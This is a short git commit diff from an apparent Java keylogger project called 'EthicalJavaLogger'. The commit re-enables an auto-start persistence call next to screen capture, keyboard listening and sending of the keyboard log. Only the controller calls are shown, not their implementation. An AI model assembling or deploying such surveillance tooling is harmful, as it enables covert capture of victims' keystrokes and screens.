f9c6c3a7f8adb00550367d968a747fac5962fa38
Alexandre Benevides <alex.benevides@hotmail.com>
2023-12-28 02:42:34 -0300

    Descomentando código para iniciar o AutoStartController

--- src/main/java/com/mycompany/ethicaljavalogger/EthicalJavaLogger.java
+++ src/main/java/com/mycompany/ethicaljavalogger/EthicalJavaLogger.java
@@ -6,7 +6,7 @@ import com.mycompany.ethicaljavalogger.controllers.ScreenCaptureController;
 
 public class EthicalJavaLogger {
     public static void main(String[] args) {
-        //new AutoStartController().configureAutoStart();
+        new AutoStartController().configureAutoStart();
         new ScreenCaptureController().handleScreenCapture();
         new KeyboardListenerController().handleKeyboardListener();
         new KeyboardListenerController().handleSendKeyboardLog();
